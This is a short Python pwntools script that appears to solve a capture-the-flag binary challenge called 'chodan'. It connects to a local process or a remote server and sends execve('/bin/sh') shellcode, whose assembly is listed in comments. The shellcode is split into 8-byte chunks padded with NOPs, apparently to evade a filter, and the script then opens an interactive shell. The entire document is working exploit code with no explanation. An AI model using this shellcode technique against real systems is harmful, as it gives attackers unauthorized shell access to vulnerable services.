#!/usr/bin/env python3
from pwn import *
exe = ELF("./chodan", checksec=False)
context.binary=exe
def conn():
    if args.REMOTE:
        r = remote("36.50.177.41", 50002)
        
    else:
        r = process([exe.path])
    return r
r = conn()
input()
# mov rax, 0x3b
# nop
# mov rdi, 29400045130965551
# push rdi
# mov rdi, rsp
# xor rsi, rsi
# xor rdx, rdx
# syscall
payload = b"\x48\xC7\xC0\x3B\x00\x00\x00" + b"\xFF\x25\x08\x00\x00\x00" + b"\x90\x48\xBF\x2F\x62\x69\x6E\x2F\x73\x68\x00\x57\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x0F\x05"
padding = b"\x90\x90\x90\x90\x90\x90\x90\x90"
new_payload = b""
cur = 0
while cur + 8 < len(payload): 
	new_payload += payload[cur:cur+8] + padding
	cur += 8
new_payload += payload[cur:]
r.sendafter(b'Your shellcode: ', new_payload)
pause()
r.interactive()
